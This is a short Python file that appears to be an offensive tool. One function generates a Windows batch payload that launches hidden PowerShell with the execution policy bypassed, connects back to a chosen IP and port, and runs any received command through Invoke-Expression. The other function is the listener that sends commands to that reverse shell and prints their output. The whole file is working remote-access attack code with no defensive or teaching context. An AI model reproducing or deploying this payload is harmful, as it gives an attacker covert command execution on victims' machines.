import socket

def generate_payload_ps(ip, port, output_file):
    batch_script_ps = f"""@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TcpClient('{ip}',{port});$s=$c.GetStream();$w=New-Object System.IO.StreamWriter($s);$w.AutoFlush=$true;$r=New-Object System.IO.StreamReader($s);while($true){{ $cmd=$r.ReadLine();if($cmd -eq $null){{break}};$out=try{{ Invoke-Expression $cmd 2>&1 | Out-String }}catch{{ $w.WriteLine($_) }};$w.WriteLine($out) }};$c.Close()"
"""
    return batch_script_ps


def listener(ip, port):
    port = int(port)

    if ip == "0.0.0.0":
        print("[*] Listening on ALL interfaces...")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        server.bind((ip, port))
    except OSError as e:
        print(f"[-] Failed to bind: {e}")
        return

    server.listen(1)
    print(f"[*] Listening on {ip}:{port}...")

    client, addr = server.accept()
    print(f"[+] Connection received from {addr}")

    try:
        while True:
            command = input("Shell> ").strip()
            if command.lower() in ["exit", "quit"]:
                client.send(b"exit")
                client.close()
                break

            client.send(command.encode() + b"\n")
            response = client.recv(4096).decode(errors="ignore")
            print(response)
    except (ConnectionResetError, KeyboardInterrupt):
        print("[-] Connection lost.")
    finally:
        client.close()
        server.close()
